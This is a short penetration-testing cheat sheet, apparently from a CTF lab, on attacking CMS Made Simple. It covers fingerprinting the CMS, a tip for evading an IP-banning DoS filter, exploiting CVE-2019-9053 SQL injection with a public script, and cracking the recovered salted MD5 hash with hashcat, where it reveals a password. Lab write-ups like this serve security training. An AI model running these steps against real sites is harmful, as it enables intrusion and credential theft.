# CMS Made Simple

## Discovery

```bash
# Cookie in HTTP requests identifies the CMS
Cookie: CMSSESSID9d372ef93962=njl8ca7p398vm8ca0n6l0jnuq7

# Meta tag in HTML source
<meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019. All rights reserved." />

# moduleinterface.php exists
http://TARGET/writeup/moduleinterface.php
```

---

## Eeyore DoS Protection

Some installations have DoS protection that monitors Apache 40x errors and bans IPs:

```
Eeyore DoS protection script that is in place and
watches for Apache 40x errors and bans bad IPs.
```

This blocks:
- Directory fuzzing (feroxbuster, gobuster, ffuf)
- Nikto scans
- SQLMap

**Workaround:** Target known endpoints directly, avoid triggering 404s.

---

## CVE-2019-9053 - SQL Injection

**Exploitation:**

```bash
git clone https://github.com/Dh4nuJ4/SimpleCTF-UpdatedExploit
cd SimpleCTF-UpdatedExploit

python3 updated_46635.py -u http://TARGET/writeup/
```

**Output:**

```
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
```

---

## Cracking the Hash

CMS Made Simple uses `md5($salt.$pass)` - Hashcat mode 20.

```bash
# Format: hash:salt
cat hash.txt
62def4866937f08cc13bab43bb14e6f7:5a599ef579066807

# Crack with hashcat
hashcat -a 0 -m 20 hash.txt /usr/share/wordlists/rockyou.txt

# Result
62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9
```
